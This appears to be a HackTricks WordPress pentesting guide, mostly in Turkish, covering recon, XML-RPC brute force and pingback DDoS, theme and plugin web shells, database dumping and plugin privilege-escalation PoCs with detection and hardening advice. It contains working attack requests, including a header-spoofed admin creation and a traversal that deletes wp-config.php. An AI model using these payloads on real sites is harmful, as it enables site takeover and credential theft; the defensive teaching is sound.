# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

- **Uploaded** dosyaları şuraya gider: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** bu yüzden tema içindeki bazı php dosyalarını değiştirip RCE elde etmeye çalışıyorsanız muhtemelen bu yolu kullanırsınız. Örneğin: **theme twentytwelve** kullanarak **404.php** dosyasına şu konumdan **erişebilirsiniz**: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** veritabanının root parolasını bulabilirsiniz.
- Kontrol edilecek varsayılan giriş yolları: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` yüklü WordPress sürümü gibi faydalı bilgiler içerir.
- `wp-activate.php` yeni bir WordPress sitesi kurarken e-posta aktivasyon süreci için kullanılır.
- Giriş klasörleri (gizlemek için yeniden adlandırılmış olabilir):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` HTTP'yi taşıma mekanizması ve XML'i kodlama mekanizması olarak kullanarak veri iletimini sağlayan WordPress özelliğini temsil eden bir dosyadır. Bu tür iletişim WordPress [REST API](https://developer.wordpress.org/rest-api/reference) ile değiştirilmiştir.
- `wp-content` klasörü eklentilerin ve temaların saklandığı ana dizindir.
- `wp-content/uploads/` platforma yüklenen dosyaların saklandığı dizindir.
- `wp-includes/` sertifikalar, fontlar, JavaScript dosyaları ve widget'lar gibi çekirdek dosyalarının bulunduğu dizindir.
- `wp-sitemap.xml` Wordpress sürümleri 5.5 ve üzeri için tüm herkese açık yazılar ve herkese açık sorgulanabilir yazı tipleri ile taksonomiler içeren bir sitemap XML dosyası oluşturur.

**Post exploitation**

- `wp-config.php` dosyası WordPress'in veritabanına bağlanmak için ihtiyaç duyduğu veritabanı adı, veritabanı hostu, kullanıcı adı ve parola, authentication keys ve salts, ve veritabanı tablo ön eki gibi bilgileri içerir. Bu yapılandırma dosyası ayrıca DEBUG modunu etkinleştirmek için de kullanılabilir; bu, sorun giderme sırasında faydalı olabilir.

### Kullanıcı Yetkileri

- **Yönetici**
- **Editör**: Kendi ve başkalarının yazılarını yayınlar ve yönetir
- **Yazar**: Kendi yazılarını yayınlar ve yönetir
- **Katkıda Bulunan**: Yazılarını yazar ve yönetir ancak yayınlayamaz
- **Abone**: Yazıları görüntüler ve profilini düzenler

## **Pasif Keşif**

### **WordPress sürümünü öğrenme**

`/license.txt` veya `/readme.html` dosyalarını bulup bulamayacağınızı kontrol edin.

Sayfanın **kaynak kodu** içinde (örnek: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link dosyaları

![](<../../images/image (533).png>)

- JavaScript dosyaları

![](<../../images/image (524).png>)

### Eklentileri Al
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Temaları Al
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Genel olarak sürümleri çıkarma
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktif keşif

### Eklentiler ve Temalar

Muhtemelen tüm Eklentileri ve Temaları bulamayacaksınız. Tümünü keşfetmek için **aktif olarak Eklentiler ve Temalar listesini Brute Force etmeniz** gerekecek (umarım bu listeleri içeren otomatik araçlar vardır).

### Kullanıcılar

- **ID Brute:** Geçerli kullanıcıları bir WordPress sitesinden kullanıcı ID'lerini Brute Forcing yaparak elde edersiniz:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Eğer yanıtlar **200** veya **30X** ise, bu id'nin **geçerli** olduğu anlamına gelir. Eğer yanıt **400** ise, id **geçersiz**dir.

- **wp-json:** Kullanıcılar hakkında bilgi almak için şu sorguyu deneyebilirsiniz:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Kullanıcılar hakkında bazı bilgiler açığa çıkarabilecek başka bir `/wp-json/` endpoint şudur:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **Sadece bu özelliği etkinleştirmiş kullanıcılara ait bilgiler sağlanacaktır**.

Ayrıca **/wp-json/wp/v2/pages** IP adreslerini leak edebilir.

- **Login username enumeration**: **`/wp-login.php`**'ye giriş yaparken **mesaj** **farklıdır**; bu **kullanıcı adının var olup olmadığı** bilgisini gösterir.

### XML-RPC

Eğer `xml-rpc.php` aktifse credentials brute-force gerçekleştirebilir veya diğer kaynaklara DoS saldırıları başlatmak için kullanabilirsiniz. (Örneğin bu süreci[ using this](https://github.com/relarizky/wpxploit) ile otomatikleştirebilirsiniz).

Aktif olup olmadığını görmek için _**/xmlrpc.php**_ adresine erişmeyi deneyin ve bu isteği gönderin:

**Kontrol**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** veya **`metaWeblog.getUsersBlogs`** credentials üzerinde brute-force yapmak için kullanılabilecek bazı yöntemlerdir. Eğer bunlardan herhangi birini bulursanız, şu gibi bir şey gönderebilirsiniz:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Kimlik bilgileri geçersizse 200 kodlu yanıtta _"Yanlış kullanıcı adı veya parola"_ mesajı görünmelidir.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Doğru kimlik bilgilerini kullanarak bir dosya yükleyebilirsiniz. Yanıtta yol şu şekilde görünecektir ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

This method is meant for programs and not for humans, and old, therefore it doesn't support 2FA. So, if you have valid creds but the main entrance is protected by 2FA, **you might be able to abuse xmlrpc.php to login with those creds bypassing 2FA**. Note that you won't be able to perform all the actions you can do through the console, but you might still be able to get to RCE as Ippsec explains it in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **thousands** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** lo **scan** some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Eğer **faultCode** değeri **0**'dan (17) **daha büyük** ise, bu portun açık olduğu anlamına gelir.

Önceki bölümde **`system.multicall`** kullanımına göz atın; bu yöntemi DDoS oluşturmak için nasıl kötüye kullanacağınızı öğrenin.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Bu dosya genellikle Wordpress sitesinin kök dizininde bulunur: **`/wp-cron.php`**\
Bu dosya **erişildiğinde** "**ağır**" bir MySQL **query** çalıştırılır; bu yüzden **attackers** bir **DoS** oluşturmak için bunu kullanabilir.\
Ayrıca, varsayılan olarak, `wp-cron.php` her sayfa yüklenmesinde (bir client herhangi bir Wordpress sayfasını istediğinde) çağrılır; bu da yüksek trafikli sitelerde sorunlara (DoS) yol açabilir.

Wp-Cron'un devre dışı bırakılması ve gereken işlemleri düzenli aralıklarla (sorun yaratmadan) gerçekleştirecek gerçek bir cronjob'un host üzerinde oluşturulması önerilir.

### /wp-json/oembed/1.0/proxy - SSRF

Try to access _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ and the Wordpress site may make a request to you.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Bu araç **methodName: pingback.ping** için ve **/wp-json/oembed/1.0/proxy** path'i için kontrol eder; eğer mevcutsa onları exploit etmeye çalışır.

## Otomatik Araçlar
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Bir biti değiştirerek erişim sağlama

Gerçek bir saldırıdan çok bir merak konusu. CTF'de [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) herhangi bir wordpress dosyasındaki 1 biti çevirebiliyordunuz. Bu yüzden `/var/www/html/wp-includes/user.php` dosyasının `5389` konumundaki biti NOP yaparak NOT (`!`) operasyonunu devre dışı bırakabilirdiniz.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Kullanılan tema içindeki bir php dosyasını değiştirme (admin kimlik bilgileri gerekli)**

Appearance → Theme Editor → 404 Template (sağda)

İçeriği bir php shell için değiştirin:

![](<../../images/image (384).png>)

Güncellenen sayfaya nasıl erişileceğini internette araştırın. Bu durumda şuraya erişmeniz gerekiyor: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Şunu kullanabilirsiniz:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
oturum elde etmek için.

## Plugin RCE

### PHP plugin

.php dosyalarını bir plugin olarak yüklemek mümkün olabilir.\
Örneğin şu şekilde php backdoor oluşturun:

![](<../../images/image (183).png>)

Sonra yeni bir plugin ekleyin:

![](<../../images/image (722).png>)

Plugin'i yükleyin ve Install Now'a basın:

![](<../../images/image (249).png>)

Procced'e tıklayın:

![](<../../images/image (70).png>)

Muhtemelen görünürde herhangi bir şey olmayacaktır, ancak Media'ya giderseniz shell'inizin yüklendiğini göreceksiniz:

![](<../../images/image (462).png>)

Erişin ve reverse shell'i çalıştırmak için URL'yi göreceksiniz:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Bu yöntem, bilinen zafiyete sahip kötü amaçlı bir plugin'in kurulmasını ve web shell elde etmek için sömürülmesini içerir. Bu süreç WordPress dashboard'u üzerinden şu şekilde gerçekleştirilir:

1. **Plugin Acquisition**: Plugin, Exploit DB gibi bir kaynaktan edinilir; örneğin [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- WordPress dashboard'ına gidin, ardından `Dashboard > Plugins > Upload Plugin` yolunu izleyin.
- İndirilen plugin'in zip dosyasını yükleyin.
3. **Plugin Activation**: Plugin başarılı şekilde yüklendikten sonra dashboard üzerinden etkinleştirilmelidir.
4. **Exploitation**:
- "reflex-gallery" plugin'i yüklendiğinde ve etkinleştirildiğinde, bilinen bir zafiyet nedeniyle sömürülebilir.
- Metasploit framework bu zafiyet için bir exploit sunar. Uygun modülü yükleyip belirli komutları çalıştırarak bir meterpreter session kurulabilir ve siteye yetkisiz erişim sağlanabilir.
- Bu, WordPress sitesini sömürmek için kullanılabilecek birçok yöntemden sadece biridir.

İçerik, plugin'in yüklenmesi ve etkinleştirilmesi adımlarını gösteren WordPress dashboard görüntülerini içermektedir. Ancak, bu şekilde zafiyetleri sömürmenin uygun yetki olmadan yasa dışı ve etik dışı olduğunu unutmamak önemlidir. Bu bilgi, yalnızca yetkili bir bağlamda, örneğin açık izinli penetration testing gibi yasal çerçevede sorumlu şekilde kullanılmalıdır.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). It provides **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ WordPress'te bir kullanıcı oluşturur.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Özel plugin'inizi (backdoor) WordPress'e yükler.
- _**(RCE) Built-In Plugin Edit:**_ WordPress'teki Built-In Plugin'leri düzenler.
- _**(RCE) Built-In Theme Edit:**_ WordPress'teki Built-In Theme'leri düzenler.
- _**(Custom) Custom Exploits:**_ Üçüncü taraf WordPress Plugin/Theme'leri için özel exploitler sağlar.

## Post Exploitation

Kullanıcı adları ve parolaları çıkar:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
admin şifresini değiştir:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Eklentileri Pentest

### Saldırı Yüzeyi

Bir Wordpress eklentisinin işlevselliği nasıl ortaya koyabildiğini bilmek, o işlevsellikteki zafiyetleri bulmak için kritiktir. Bir eklentinin işlevselliği nasıl ortaya koyabileceğini aşağıdaki madde işaretlerinde bulabilirsiniz ve bazı savunmasız eklenti örnekleri için [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) sayfasına bakın.

- **`wp_ajax`**

Bir eklentinin işlevlerini kullanıcılara açmasının yollarından biri AJAX işleyicileri aracılığıyladır. Bunlar mantık, authorization veya authentication hataları içerebilir. Ayrıca, bu işlevlerin sıklıkla hem authentication hem de authorization'ı bir Wordpress nonce'unun varlığına dayandırdığını görürüz; bu nonce **Wordpress örneğinde kimliği doğrulanmış herhangi bir kullanıcının sahip olabileceği** (rolünden bağımsız olarak) bir değerdir.

These are the functions that can be used to expose a function in a plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` kullanımı endpoint'e herhangi bir kullanıcı tarafından erişilebilir hale getirir (hatta kimlik doğrulanmamış kullanıcılar dahil).**

> [!CAUTION]
> Ek olarak, eğer fonksiyon sadece kullanıcının yetkilendirmesini `wp_verify_nonce` fonksiyonu ile kontrol ediyorsa, bu fonksiyon genellikle sadece kullanıcının oturum açmış olduğunu kontrol eder; kullanıcının rolünü genellikle kontrol etmez. Bu nedenle düşük yetkili kullanıcılar yüksek ayrıcalıklı işlemlere erişebilir.

- **REST API**

Ayrıca WordPress'te fonksiyonları `register_rest_route` fonksiyonunu kullanarak bir REST API kaydederek erişime açmak da mümkündür:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` belirli bir kullanıcının API yöntemini çağırmaya yetkili olup olmadığını kontrol eden bir callback fonksiyonudur.

**Yerleşik `__return_true` fonksiyonu kullanılırsa, kullanıcı izinleri kontrolünü basitçe atlar.**

- **PHP dosyasına doğrudan erişim**

Elbette, Wordpress PHP kullanır ve plugin içindeki dosyalar web üzerinden doğrudan erişilebilir. Bu yüzden, bir plugin yalnızca dosyaya erişilerek tetiklenen herhangi bir savunmasız fonksiyonellik sunuyorsa, bu herhangi bir kullanıcı tarafından exploit edilebilir olacak.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Bazı pluginler dahili entegrasyonlar veya reverse proxies için “trusted header” kısayolları uygular ve daha sonra REST istekleri için mevcut kullanıcı bağlamını ayarlamak için bu header'ı kullanır. Eğer header upstream bir bileşen tarafından kriptografik olarak isteğe bağlanmamışsa, bir saldırgan onu spoof yapabilir ve ayrıcalıklı REST rotalarına administrator olarak erişebilir.

- Etki: doğrulanmamış privilege escalation ile admin yetkisine yükseltme — core users REST route üzerinden yeni bir administrator oluşturarak.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (kullanıcı ID'si 1'i zorlar, genellikle ilk administrator hesabı).
- İstismar edilen rota: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Neden işe yarıyor

- Eklenti, istemci tarafından kontrol edilen bir header'ı kimlik doğrulama durumuna eşleyip yetenek kontrollerini atlıyor.
- WordPress core bu route için `create_users` yeteneğini bekler; eklenti hilesi header'dan doğrudan current user context ayarlayarak bunu atlıyor.

Beklenen başarı göstergeleri

- Oluşturulan kullanıcıyı tanımlayan bir JSON gövdesi ile HTTP 201.
- `wp-admin/users.php` içinde görünen yeni bir admin kullanıcı.

Tespit kontrol listesi

- `getallheaders()`, `$_SERVER['HTTP_...']` veya özel headerları okuyup kullanıcı bağlamı ayarlayan vendor SDK'ları (ör. `wp_set_current_user()`, `wp_set_auth_cookie()`) için grep ile ara.
- Yetkisiz callback'lerin sağlam `permission_callback` kontrolleri olmadan REST kayıtlarında kullanılıp kullanılmadığını gözden geçir ve bunun yerine request headerlarına güvenilip güvenilmediğine bak.
- REST handler'ları içinde yalnızca header değerleriyle kapatılmış core kullanıcı yönetim fonksiyonlarının (`wp_insert_user`, `wp_create_user`) kullanımına bak.

Sertleştirme

- Kimlik doğrulama veya yetkilendirmeyi istemci kontrollü header'lardan türetmeyin.
- Eğer bir reverse proxy kimlik enjekte etmek zorundaysa, güveni proxynin kenarında sonlandırın ve gelen kopyaları temizleyin (ör. kenarda `unset X-Wcpay-Platform-Checkout-User`), sonra imzalı bir token ile iletin ve bunu server-side doğrulayın.
- Ayrıcalıklı işlemler yapan REST route'ları için `current_user_can()` kontrolleri ve katı bir `permission_callback` zorunlu kılın (ASLA `__return_true` kullanmayın).
- Header “impersonation” yerine öncelikle first-party auth (cookies, application passwords, OAuth) kullanın.

Referanslar: halka açık bir vaka ve daha geniş analiz için bu sayfanın sonundaki bağlantılara bakın.

### Kimlik doğrulama olmadan rastgele dosya silme wp_ajax_nopriv aracılığıyla (Litho Theme <= 3.0)

WordPress theme'leri ve plugin'leri sıklıkla `wp_ajax_` ve `wp_ajax_nopriv_` hook'ları aracılığıyla AJAX handler'ları açığa çıkarır. **_nopriv_** varyantı kullanıldığında **callback kimlik doğrulaması olmayan ziyaretçiler tarafından erişilebilir hale gelir**, bu yüzden herhangi bir hassas işlem ayrıca şunları uygulamalıdır:

1. Bir **capability check** (örn. `current_user_can()` veya en azından `is_user_logged_in()`), ve
2. `check_ajax_referer()` / `wp_verify_nonce()` ile doğrulanan bir **CSRF nonce**, ve
3. **Sıkı input sanitizasyonu / validasyonu**.

Litho multipurpose theme (< 3.1) bu 3 kontrolü *Remove Font Family* özelliğinde unutmuş ve sonuç olarak aşağıdaki kodu (basitleştirilmiş) göndermiştir:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Bu kod parçasının yol açtığı sorunlar:

* **Yetkilendirilmemiş erişim** – `wp_ajax_nopriv_` hook'u kayıtlı.
* **Nonce / capability check yok** – herhangi bir ziyaretçi endpoint'i çağırabilir.
* **Yol temizleme (sanitisation) yok** – kullanıcı kontrolündeki `fontfamily` string'i filtrelenmeden bir dosya sistemi yoluna ekleniyor; bu da klasik `../../` traversal'a izin veriyor.

#### İstismar

Bir saldırgan tek bir HTTP POST isteği göndererek **uploads ana dizininin altındaki** herhangi bir dosya veya dizini silebilir (normalde `<wp-root>/wp-content/uploads/`):
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### Tespit kontrol listesi

* `add_action( 'wp_ajax_nopriv_...')` callback'larında dosya sistemi yardımcılarını (`copy()`, `unlink()`, `$wp_filesystem->delete()`, vb.) çağıran herhangi bir şey.
* Temizlenmemiş kullanıcı girdisinin dosya yollarına eklenmesi (bak: `$_POST`, `$_GET`, `$_REQUEST`).
* `check_ajax_referer()` ve `current_user_can()`/`is_user_logged_in()` yokluğu.

#### Sertleştirme
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Always** disk üzerinde yapılacak herhangi bir yazma/silme işlemini ayrıcalıklı (privileged) olarak kabul edin ve şu konuları iki kez kontrol edin:
> • Authentication  • Authorisation  • Nonce  • Input sanitisation  • Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via eskimiş rolün geri yüklenmesi ve eksik yetkilendirme (ASE "View Admin as Role")

Birçok eklenti, orijinal rol(leri) daha sonra geri yüklenebilmesi için user meta içine kaydederek "view as role" veya geçici rol değiştirme özelliği uygular. Eğer geri yükleme yolu yalnızca istek parametrelerine (ör. `$_REQUEST['reset-for']`) ve eklenti tarafından tutulan bir listeye dayanıyor ve capabilities kontrolü ile geçerli bir nonce doğrulaması yapılmıyorsa, bu dikey bir privilege escalation'e dönüşür.

Gerçek bir örnek Admin and Site Enhancements (ASE) eklentisinde (≤ 7.6.2.1) bulundu. Reset dalı, kullanıcı adı dahili bir dizi `$options['viewing_admin_as_role_are']` içinde görünüyorsa `reset-for=<username>` bazında rolleri geri yüklüyordu, fakat mevcut rolleri kaldırıp kullanıcı metasından `_asenha_view_admin_as_original_roles` ile kaydedilmiş rolleri yeniden eklemeden önce ne `current_user_can()` kontrolü ne de nonce doğrulaması yapıyordu:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Neden sömürülebilir

- `$_REQUEST['reset-for']` ve bir eklenti seçeneğine sunucu tarafı yetkilendirmesi olmadan güveniyor.
- Bir kullanıcı daha önce `_asenha_view_admin_as_original_roles` içinde yüksek ayrıcalıklar kaydetmişse ve yetkileri düşürülmüşse, reset path'e erişerek bunları geri yükleyebilir.
- Bazı dağıtımlarda, herhangi bir kimliği doğrulanmış kullanıcı `viewing_admin_as_role_are` içinde hâlâ bulunan başka bir kullanıcı adı için reset tetikleyebilir (bozuk yetkilendirme).

Saldırı önkoşulları

- Özelliği etkinleştirilmiş zafiyetli eklenti sürümü.
- Hedef hesabın, önceki kullanımdan user meta içinde saklanmış eskimiş yüksek ayrıcalıklı bir rolü var.
- Herhangi bir kimliği doğrulanmış oturum; reset akışında nonce/capability eksik.

İstismar (örnek)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Etkilenebilir sürümlerde bu, mevcut rolleri kaldırır ve kaydedilmiş orijinal rolleri (ör. `administrator`) yeniden ekler; bu da ayrıcalık yükseltimine yol açar.

Detection checklist

- Kullanıcı meta verisinde “original roles” değerini saklayan rol-değiştirme özelliklerini arayın (ör. `_asenha_view_admin_as_original_roles`).
- Sıfırlama/geri yükleme yollarını belirleyin ki:
- Kullanıcı adlarını `$_REQUEST` / `$_GET` / `$_POST`'ten okuyan.
- Rolleri `add_role()` / `remove_role()` ile, `current_user_can()` ve `wp_verify_nonce()` / `check_admin_referer()` olmadan değiştiren.
- Yetkilendirmeyi aktörün yetenekleri yerine bir eklenti seçenek dizisine (ör. `viewing_admin_as_role_are`) dayandıran.

Hardening

- Her durum-değiştiren dalda yetenek kontrollerini uygulayın (ör. `current_user_can('manage_options')` veya daha sıkı).
- Tüm rol/izin değişiklikleri için nonce zorunlu kılın ve doğrulayın: `check_admin_referer()` / `wp_verify_nonce()`.
- İstekle gelen kullanıcı adlarına asla güvenmeyin; hedef kullanıcıyı sunucu tarafında, kimlik doğrulanmış aktöre ve açık politikalara göre belirleyin.
- Profil/rol güncellemelerinde “original roles” durumunu geçersiz kılın, böylece eski yüksek ayrıcalıkların geri yüklenmesini engelleyin:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Geçici rol değişiklikleri için mümkün olan en az durumu saklamayı ve zaman sınırlı, yetki-korumalı belirteçler kullanmayı düşünün.

---

### Kimlik doğrulanmamış yetki yükseltme — public `init` üzerinde cookie‑trusted user switching (Service Finder “sf-booking”)

Bazı pluginler, user-switching yardımcılarını public `init` hook'una bağlıyor ve kimliği bir istemci tarafından kontrol edilen cookie'den türetiyor. Eğer kod, kimlik doğrulama, yetki ve geçerli bir nonce doğrulamadan `wp_set_auth_cookie()` çağırıyorsa, herhangi bir kimlik doğrulanmamış ziyaretçi rastgele bir kullanıcı ID'si olarak giriş yapmayı zorlayabilir.

Tipik zafiyet deseni (Service Finder Bookings ≤ 6.1'den basitleştirilmiş):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
